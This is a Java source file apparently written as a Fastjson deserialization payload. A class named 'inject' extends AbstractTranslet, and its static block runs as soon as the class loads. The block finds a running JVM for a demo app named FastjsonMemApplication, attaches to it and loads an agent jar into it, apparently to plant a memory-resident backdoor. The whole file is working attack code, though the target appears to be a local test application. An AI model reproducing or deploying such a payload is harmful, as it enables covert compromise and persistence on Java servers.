import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.File;
import java.net.URL;
import java.net.URLClassLoader;

public class inject extends AbstractTranslet {
    static {
        String agentpath = "F:\\FastjsonMem\\target\\FastjsonMem-0.0.1-SNAPSHOT.jar";
        String toolsjarpath = System.getProperty("java.home").replace("jre","lib") + File.separator + "tools.jar";
        File toolsjar = new File(toolsjarpath);
        URL url = null;
        try{
            url = toolsjar.toURI().toURL();
            URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url}, null);

            Class<?> virtualMachine = urlClassLoader.loadClass("com.sun.tools.attach.VirtualMachine");
            Class<?> VirtualMachineDescriptor = urlClassLoader.loadClass("com.sun.tools.attach.VirtualMachineDescriptor");
            java.lang.reflect.Method listMethod = virtualMachine.getDeclaredMethod("list",new Class[]{});
            java.util.List<Object> pidlist = (java.util.List<Object>) listMethod.invoke(null, new Object[]{});
            for (int i = 0; i < pidlist.size(); i++) {
                Object o = pidlist.get(i);
                java.lang.reflect.Method displayName = o.getClass().getSuperclass().getDeclaredMethod("displayName");
                Object name = displayName.invoke(o, new Object[]{});

                if (name.toString().contains("com.example.fastjsonmem.FastjsonMemApplication")) {
                    java.lang.reflect.Method attach = virtualMachine.getDeclaredMethod("attach", new Class[]{VirtualMachineDescriptor});

                    Object machin = attach.invoke(virtualMachine, o);

                    java.lang.reflect.Method loadAgent = machin.getClass().getSuperclass().getSuperclass().getDeclaredMethod("loadAgent", new Class[]{String.class});
                    loadAgent.invoke(machin, agentpath);

                    java.lang.reflect.Method detach = virtualMachine.getDeclaredMethod("detach", new Class[]{});
                    detach.invoke(machin, new Object[]{});
                    break;
                }
            }

        }catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}